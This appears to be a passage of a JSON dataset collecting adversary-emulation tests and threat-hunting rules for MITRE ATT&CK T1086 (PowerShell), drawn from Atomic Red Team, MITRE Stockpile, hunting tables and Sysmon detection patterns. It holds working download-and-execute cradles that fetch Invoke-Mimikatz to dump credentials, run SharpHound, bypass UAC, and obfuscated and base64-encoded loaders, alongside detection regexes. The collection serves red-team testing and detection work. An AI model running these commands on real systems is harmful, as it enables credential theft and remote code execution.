"powershell.exe", "name": "sub_process_2"}, {"source": "Threat Hunting Tables", "command": "powerpoint.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "powershell.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "powershell.exe webClient.DownloadString(", "name": null}, {"source": "Threat Hunting Tables", "command": "powershell.exe webClient.DownloadFile", "name": null}, {"source": "Threat Hunting Tables", "command": "powershell.exe webClient.DownloadData", "name": null}, {"source": "Threat Hunting Tables", "command": "winword.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "powershell.exe", "name": "sub_process_1"}, {"source": "SysmonHunter - PowerShell", "command": "\\\\Windows\\\\.+\\\\WindowsPowerShell\\\\.+\\\\powershell.exehidden|-enc|-NonI", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_psremoting", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_psremoting", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/spawn", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/spawn", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/management/multi/spawn", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/management/multi/spawn", "name": "Empire Module Command"}], "parsed_datasets": [{"Atomic Red Team Test - PowerShell": {"attack_technique": "T1086", "display_name": "PowerShell", "atomic_tests": [{"name": "Mimikatz", "description": "Download Mimikatz and dump credentials. Upon execution, mimikatz dump details and password hashes will be displayed.\n", "supported_platforms": ["windows"], "input_arguments": {"mimurl": {"description": "Mimikatz url", "type": "url", "default": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1"}}, "executor": {"name": "command_prompt", "elevation_required": true, "command": "powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds\"\n"}}, {"name": "Run BloodHound from local disk", "description": "Upon execution SharpHound will be downloaded to disk, imported and executed. It will set up collection methods, run and then compress and store the data to the temp directory on the machine. If system is unable to contact a domain, proper execution will not occur.\n\nSuccessful execution will produce stdout message stating \"SharpHound Enumeration Completed\". Upon completion, final output will be a *BloodHound.zip file.\n", "supported_platforms": ["windows"], "input_arguments": {"file_path": {"description": "File path for SharpHound payload", "type": "String", "default": "PathToAtomicsFolder\\T1086\\src"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "SharpHound.ps1 must be located at #{file_path}\n", "prereq_command": "if (Test-Path #{file_path}\\SharpHound.ps1) {exit 0} else {exit 1}\n", "get_prereq_command": "Invoke-WebRequest \"https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1\" -OutFile \"#{file_path}\\SharpHound.ps1\"\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "write-host \"Import and Execution of SharpHound.ps1 from #{file_path}\" -ForegroundColor Cyan\nimport-module #{file_path}\\SharpHound.ps1\nInvoke-BloodHound -OutputDirectory $env:Temp\nStart-Sleep 5\n", "cleanup_command": "Remove-Item #{file_path}\\SharpHound.ps1 -Force -ErrorAction Ignore\nRemove-Item $env:Temp\\*BloodHound.zip -Force\n"}}, {"name": "Run Bloodhound from Memory using Download Cradle", "description": "Upon execution SharpHound will load into memory and execute against a domain. It will set up collection methods, run and then compress and store the data to the temp directory. If system is unable to contact a domain, proper execution will not occur.\n\nSuccessful execution will produce stdout message stating \"SharpHound Enumeration Completed\". Upon completion, final output will be a *BloodHound.zip file.\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "write-host \"Remote download of SharpHound.ps1 into memory, followed by execution of the script\" -ForegroundColor Cyan\nIEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');\nInvoke-BloodHound -OutputDirectory $env:Temp\nStart-Sleep 5\n", "cleanup_command": "Remove-Item $env:Temp\\*BloodHound.zip -Force\n"}}, {"name": "Obfuscation Tests", "description": "Different obfuscated methods to test. Upon execution, reaches out to bit.ly/L3g1t and displays: \"SUCCESSFULLY EXECUTED POWERSHELL CODE FROM REMOTE LOCATION\"\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))\n(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()\nSet-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))\n"}}, {"name": "Mimikatz - Cradlecraft PsSendKeys", "description": "Run mimikatz via PsSendKeys. Upon execution, automated actions will take place to open file explorer, open notepad and input code, then mimikatz dump info will be displayed.\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": true, "command": "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr\n"}}, {"name": "Invoke-AppPathBypass", "description": "Note: Windows 10 only. Upon execution windows backup and restore window will be opened.\n\nBypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "Powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\"\n"}}, {"name": "Powershell MsXml COM object - with prompt", "description": "Powershell MsXml COM object. Not proxy aware, removing cache although does not appear to write to those locations. Upon execution, \"Download Cradle test success!\" will be displayed.\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n", "supported_platforms": ["windows"], "input_arguments": {"url": {"description": "url of payload to execute", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/test.ps1"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "powershell.exe -exec bypass -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\"\n"}}, {"name": "Powershell XML requests", "description": "Powershell xml download request. Upon execution, \"Download Cradle test success!\" will be dispalyed.\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n", "supported_platforms": ["windows"], "input_arguments": {"url": {"description": "url of payload to execute", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/test.xml"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -exec bypass -noprofile \"$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX\"\n"}}, {"name": "Powershell invoke mshta.exe download", "description": "Powershell invoke mshta to download payload. Upon execution, a new PowerShell window will be opened which will display \"Download Cradle test success!\".\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n", "supported_platforms": ["windows"], "input_arguments": {"url": {"description": "url of payload to execute", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/mshta.sct"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "C:\\Windows\\system32\\cmd.exe /c \"mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()\"\n"}}, {"name": "Powershell Invoke-DownloadCradle", "description": "Provided by https://github.com/mgreen27/mgreen27.github.io\nInvoke-DownloadCradle is used to generate Network and Endpoint artifacts.\n", "supported_platforms": ["windows"], "executor": {"name": "manual", "steps": "1. Open Powershell_ise as a Privileged Account\n2. Invoke-DownloadCradle.ps1\n"}}, {"name": "PowerShell Fileless Script Execution", "description": "Execution of a PowerShell payload from the Windows Registry similar to that seen in fileless malware infections. Upon exection, open \"C:\\Windows\\Temp\" and verify that\nart-marker.txt is in the folder.\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": true, "command": "# Encoded payload in next command is the following \"Set-Content -path \"$env:SystemRoot/Temp/art-marker.txt\" -value \"Hello from the Atomic Red Team\"\"\nreg.exe add \"HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam\" /v ART /t REG_SZ /d \"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=\"\niex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\\Software\\Classes\\AtomicRedTeam').ART)))\n", "cleanup_command": "Remove-Item -path C:\\Windows\\Temp\\art-marker.txt -Force -ErrorAction Ignore\nRemove-Item HKCU:\\Software\\Classes\\AtomicRedTeam -Force -ErrorAction Ignore\n"}}, {"name": "PowerShell Downgrade Attack", "description": "This test requires the manual installation of PowerShell V2.\n\nAttempts to run powershell commands in version 2.0 https://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/\n", "supported_platforms": ["windows"], "dependencies": [{"description": "PowerShell version 2 must be installed\n", "prereq_command": "if(2 -in $PSVersionTable.PSCompatibleVersions.Major) {exit 0} else {exit 1}\n", "get_prereq_command": "Write-Host  Automated installer not implemented yet, please install PowerShell v2 manually\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "powershell.exe -version 2 -Command Write-Host $PSVersion\n"}}, {"name": "NTFS Alternate Data Stream Access", "description": "Creates a file with an alternate data stream and simulates executing that hidden code/file. Upon execution, \"Stream Data Executed\" will be displayed.\n", "supported_platforms": ["windows"], "input_arguments": {"ads_file": {"description": "File created to store Alternate Stream Data", "type": "String", "default": "$env:TEMP\\NTFS_ADS.txt"}}, "dependencies": [{"description": "Homedrive must be an NTFS drive\n", "prereq_command": "if((Get-Volume -DriveLetter $env:HOMEDRIVE[0]).FileSystem -contains \"NTFS\") {exit 0} else {exit 1}\n", "get_prereq_command": "Write-Host Prereq's for this test cannot be met automatically\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "Add-Content -Path #{ads_file} -Value 'Write-Host \"Stream Data Executed\"' -Stream 'streamCommand'\n$streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand'\nInvoke-Expression $streamcommand\n", "cleanup_command": "Remove-Item #{ads_file} -Force -ErrorAction Ignore\n"}}]}}, {"Mitre Stockpile - Capture running processes via PowerShell": {"id": "4d9b079c-9ede-4116-8b14-72ad3a5533af", "name": "PowerShell Process Enumeration", "description": "Capture running processes via PowerShell", "tactic": "collection", "technique": {"attack_id": "T1086", "name": "PowerShell Collection"}, "platforms": {"windows": {"psh,pwsh": {"command": "get-process >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log\n"}}}}}, {"Mitre Stockpile - User enumeration": {"id": "55678719-e76e-4df9-92aa-10655bbd1cf4", "description": "User enumeration", "name": "cmd.exe information gathering", "tactic": "collection", "technique": {"attack_id": "T1086", "name": "PowerShell"}, "platforms": {"windows": {"psh": {"command": "cmd.exe /c \"net user\" >> C:\\Windows\\temp\\history.log;\ncmd.exe /c \"whoami /priv\" >> C:\\Windows\\temp\\history.log;\ncmd.exe /c \"netstat -ano\" >> C:\\Windows\\temp\\history.log;"}}}}}, {"Mitre Stockpile - System Information Gathering Script": {"id": "702bfdd2-9947-4eda-b551-c3a1ea9a59a2", "description": "System Information Gathering Script", "name": "PowerShell information gathering", "tactic": "collection", "technique": {"attack_id": "T1086", "name": "PowerShell"}, "platforms": {"windows": {"psh,pwsh": {"command": "powershell.exe -c \"Get-WmiObject -class win32_operatingsystem | select -property * | export-csv msdebug.log\";"}}}}}, {"Mitre Stockpile - Determine whether or not UAC is enabled": {"id": "7c42a30c-c8c7-44c5-80a8-862d364ac1e4", "name": "UAC Status", "description": "Determine whether or not UAC is enabled", "tactic": "collection", "technique": {"attack_id": "T1086", "name": "PowerShell Collection"}, "platforms": {"windows": {"psh,pwsh": {"command": "echo $(get-uac)\n"}}}}}, {"Mitre Stockpile - Copy powershell to non-standard location and perform triage commands": {"id": "e5f9de8f-3df1-4e78-ad92-a784e3f6770d", "name": "Move Powershell & triage", "description": "Copy powershell to non-standard location and perform triage commands", "tactic": "defense-evasion", "technique": {"attack_id": "T1086", "name": "PowerShell"}, "platforms": {"windows": {"psh": {"command": "Copy-Item C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\Temp\\debug.exe;\nC:\\Windows\\Temp\\debug.exe get-process >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe get-localgroup >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe get-localuser >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion >> C:\\Windows\\temp\\debug.log;\n"}}}}}, {"Mitre Stockpile - Emulate administrator tasks on a system in a separate process": {"id": "315cedf1-4a3a-4015-b63f-149d64bacbbc", "name": "Emulate Administrator Tasks", "description": "Emulate administrator tasks on a system in a separate process", "tactic": "execution", "technique": {"attack_id": "T1086", "name": "PowerShell"}, "platforms": {"windows": {"psh,pwsh": {"command": "start powershell.exe -ArgumentList \"-NoP\",\"-StA\",\"-ExecutionPolicy\",\"bypass\",\".\\Emulate-Administrator-Tasks.ps1\"\n", "cleanup": "Remove-Item -Force -Path \".\\Emulate-Administrator-Tasks.ps1\"\n", "payloads": ["Emulate-Administrator-Tasks.ps1"]}}}}}, {"Mitre Stockpile - Download": {"id": "bfff9006-d1fb-46ce-b173-92cb04e9a031", "name": "PowerShell bitly Link Download", "description": "Download", "tactic": "execution", "technique": {"attack_id": "T1086", "name": "PowerShell"}, "platforms": {"windows": {"psh": {"command": "powershell.exe -c IEX (New-Object Net.Webclient).downloadstring(\"https://bit.ly/33H0QXi\") \n"}}}}}, {"Mitre Stockpile - Download": {"id": "ccdb8caf-c69e-424b-b930-551969450c57", "name": "PowerShell Invoke MimiKats", "description": "Download", "tactic": "execution", "technique": {"attack_id": "T1086", "name": "PowerShell"}, "platforms": {"windows": {"psh": {"command": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ARQBtAHAAaQByAGUAUAByAG8AagBlAGMAdAAvAEUAbQBwAGkAcgBlAC8ANwBhADMAOQBhADUANQBmADEAMgA3AGIAMQBhAGUAYgA5ADUAMQBiADMAZAA5AGQAOAAwAGMANgBkAGMANgA0ADUAMAAwAGMAYQBjAGIANQAvAGQAYQB0AGEALwBtAG8AZAB1AGwAZQBfAHMAbwB1AHIAYwBlAC8AYwByAGUAZABlAG4AdABpAGEAbABzAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAiACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA==\n"}}}}}, {"Mitre Stockpile - Download and install PSTools by unzipping the file": {"id": "eb814e03-811a-467a-bc6d-dcd453750fa2", "name": "Install PSTools", "description": "Download and install PSTools by unzipping the file", "tactic": "execution", "technique": {"attack_id": "T1086", "name": "PowerShell"}, "platforms": {"windows": {"psh": {"command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadFile(\"https://download.sysinternals.com/files/PSTools.zip\", \"PSTools.zip\");\nNew-Item -ItemType \"directory\" C:\\Windows\\System32\\PSTools -Force;\nAdd-Type -Assembly 'System.IO.Compression.FileSystem'; [System.IO.Compression.ZipFile]::ExtractToDirectory(\"PSTools.zip\", \"C:\\Windows\\System32\\PSTools\");\n"}}}}}, {"Threat Hunting Tables": {"chain_id": "100025", "os": "windows", "parent_process": "excel.exe", "commandline_string": "", "sub_process_1": "cmd.exe", "sub_process_2": "powershell.exe", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "powershell", "mitre_attack": "T1086", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100029", "os": "windows", "parent_process": "excel.exe", "commandline_string": "", "sub_process_1": "powershell.exe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "scripting", "mitre_attack": "T1086", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100042", "os": "windows", "parent_process": "mshta.exe", "commandline_string": "", "sub_process_1": "cmd.exe", "sub_process_2": "powershell.exe", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "scripting", "mitre_attack": "T1086", "itw_sample": "3560481cc51a08c94cd5649b2782ec1395d56d9a1721e6e03720420898772ed0"}}, {"Threat Hunting Tables": {"chain_id": "100045", "os": "windows", "parent_process": "mshta.exe", "commandline_string": "", "sub_process_1": "powershell.exe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "scripting", "mitre_attack": "T1086", "itw_sample": "ee29b9c01318a1e23836b949942db14d4811246fdae2f41df9f0dcd922c63bc6"}}, {"Threat Hunting Tables": {"chain_id": "100056", "os": "windows", "parent_process": "powerpoint.exe", "commandline_string": "", "sub_process_1": "cmd.exe", "sub_process_2": "powershell.exe", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "powershell", "mitre_attack": "T1086", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100060", "os": "windows", "parent_process": "powerpoint.exe", "commandline_string": "", "sub_process_1": "powershell.exe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "powershell", "mitre_attack": "T1086", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100064", "os": "windows", "parent_process": "powershell.exe", "commandline_string": "webClient.DownloadString(", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "powershell", "mitre_attack": "T1086", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100065", "os": "windows", "parent_process": "powershell.exe", "commandline_string": "webClient.DownloadFile", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "powershell", "mitre_attack": "T1086", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100066", "os": "windows", "parent_process": "powershell.exe", "commandline_string": "webClient.DownloadData", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "powershell", "mitre_attack": "T1086", "itw_sample": "https://www.joesandbox.com/analysis/35219/0/html"}}, {"Threat Hunting Tables": {"chain_id": "100092", "os": "windows", "parent_process": "winword.exe", "commandline_string": "", "sub_process_1": "powershell.exe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "powershell", "mitre_attack": "T1086", "itw_sample": ""}}, {"SysmonHunter - T1086": {"name": "PowerShell", "description": null, "level": "high", "phase": "Execution", "query": [{"type": "process", "process": {"image": {"pattern": "\\\\Windows\\\\.+\\\\WindowsPowerShell\\\\.+\\\\powershell.exe", "flag": "regex"}, "cmdline": {"pattern": "hidden|-enc|-NonI"}}}]}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/lateral_movement/invoke_psremoting", "ATT&CK Technique #1": "T1086", "ATT&CK Technique #2": "", "Technique": "PowerShell", "Concatenate for Python Dictionary": "\"powershell/lateral_movement/invoke_psremoting\":  [\"T1086\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/management/spawn", "ATT&CK Technique #1": "T1086", "ATT&CK Technique #2": "", "Technique": "PowerShell", "Concatenate for Python Dictionary": "\"powershell/management/spawn\":  [\"T1086\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/management/multi/spawn", "ATT&CK Technique #1": "T1086", "ATT&CK Technique #2": "", "Technique": "PowerShell", "Concatenate for Python Dictionary": "\"python/management/multi/spawn\":  [\"T1086\"],"}}], "command_list": ["powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"\n", "write-host \"Import and Execution of SharpHound.ps1 from PathToAtomicsFolder\\T1086\\src\" -ForegroundColor Cyan\nimport-module PathToAtomicsFolder\\T1086\\src\\SharpHound.ps1\nInvoke-BloodHound -OutputDirectory $env:Temp\nStart-Sleep 5\n", "write-host \"Remote download of SharpHound.ps1 into memory, followed by execution of the script\" -ForegroundColor Cyan\nIEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');\nInvoke-BloodHound -OutputDirectory $env:Temp\nStart-Sleep 5\n", "(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))\n(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()\nSet-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))\n", "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr\n", "Powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\"\n", "powershell.exe -exec bypass -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\"\n", "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -exec bypass -noprofile \"$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/test.xml');$Xml.command.a.execute | IEX\"\n", "C:\\Windows\\system32\\cmd.exe /c \"mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/mshta.sct').Exec();close()\"\n", "# Encoded payload in next command is the following \"Set-Content -path \"$env:SystemRoot/Temp/art-marker.txt\" -value \"Hello from the Atomic Red Team\"\"\nreg.exe add \"HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam\" /v ART /t REG_SZ /d \"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=\"\niex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 